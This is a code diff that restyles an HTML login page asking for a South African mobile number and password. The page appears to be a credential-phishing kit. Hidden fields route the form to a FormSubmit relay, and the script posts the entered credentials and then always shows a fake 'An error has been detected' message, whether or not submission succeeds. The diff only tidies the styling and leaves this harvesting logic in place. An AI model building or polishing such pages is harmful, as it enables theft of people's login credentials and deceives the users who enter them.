@@ -2,102 +2,34 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Login Page</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #fafafa;
-      margin: 0;
-      padding: 0;
-    }
-
-    .page {
-      display: none;
-    }
-
-    .page.active {
-      display: block;
-    }
-
-    .container {
-      max-width: 400px;
-      margin: 80px auto;
-      background-color: #fff;
-      padding: 30px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-    }
-
-    h2 {
-      text-align: center;
-    }
-
-    input[type="tel"],
-    input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      margin-bottom: 20px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-
-    button[type="submit"] {
-      width: 100%;
-      background-color: #2e8b57;
-      color: white;
-      padding: 12px;
-      border: none;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: pointer;
-    }
-
-    .error-message {
-      color: #cc0000;
-      font-size: 22px;
-      font-weight: bold;
-      text-align: center;
-      padding: 40px;
-    }
-  </style>
+  <!-- Link your external CSS here -->
+  <link rel="stylesheet" href="sebono.css" />
 </head>
 <body>
 
-  <!-- Login Form Page -->
-  <div class="page active" id="form-page">
-    <div class="container">
-      <h2>Login</h2>
-      <form id="login-form">
-        <!-- These hidden fields go to FormSubmit -->
-        <input type="hidden" name="_captcha" value="false" />
+  <!-- Your HTML content here -->
+  <div id="form-page">
+    <h2>Login</h2>
+    <form id="login-form">
+      <input type="hidden" name="_captcha" value="false" />
 
-        <label for="mobile">Mobile Number</label>
-        <input type="tel" id="mobile" name="mobileNumber" placeholder="+27 Mobile Number" required />
+      <label for="mobile">Mobile Number</label><br />
+      <input type="tel" id="mobile" name="mobileNumber" placeholder="+27 Mobile Number" required /><br />
 
-        <label for="password">Password</label>
-        <input type="password" id="password" name="password" placeholder="Password" required />
+      <label for="password">Password</label><br />
+      <input type="password" id="password" name="password" placeholder="Password" required /><br />
 
-        <div><a href="#">Forgot Password?</a></div>
-
-        <button type="submit">Login</button>
-      </form>
-    </div>
+      <button type="submit">Login</button>
+    </form>
   </div>
 
-  <!-- Error Page -->
-  <div class="page" id="error-page">
-    <div class="container">
-      <div class="error-message">
-        An error has been detected, please try again later.
-      </div>
-    </div>
+  <div id="error-page" style="display:none;">
+    <h2>An error has been detected, please try again later.</h2>
   </div>
 
   <script>
     const form = document.getElementById('login-form');
-
     form.addEventListener('submit', async function (e) {
       e.preventDefault();
 
@@ -109,16 +41,15 @@
           body: formData
         });
 
-        // Show error page after submission
-        document.getElementById('form-page').classList.remove('active');
-        document.getElementById('error-page').classList.add('active');
+        document.getElementById('form-page').style.display = 'none';
+        document.getElementById('error-page').style.display = 'block';
 
       } catch (err) {
-        // Also show error page if something goes wrong
-        document.getElementById('form-page').classList.remove('active');
-        document.getElementById('error-page').classList.add('active');
+        document.getElementById('form-page').style.display = 'none';
+        document.getElementById('error-page').style.display = 'block';
       }
     });
   </script>
+
 </body>
 </html>
